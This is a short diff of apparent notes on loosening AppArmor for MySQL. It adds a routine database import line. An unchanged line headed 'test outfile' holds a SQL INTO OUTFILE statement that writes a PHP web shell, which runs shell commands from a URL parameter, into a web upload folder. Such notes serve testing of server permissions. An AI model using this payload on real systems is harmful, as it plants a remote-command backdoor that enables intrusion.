@@ -111,5 +111,7 @@ sudo nano /etc/apparmor.d/local/usr.sbin.mysqld
 
 sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.mysqld 
 
+mysql -u username -p dbname < dbexport.sql
+
 測試outfile
 select 1,2,3,"<?php echo shell_exec($_GET['cmd']) ?>"  from item into outfile "/var/www/html/upfiles/shell.php";
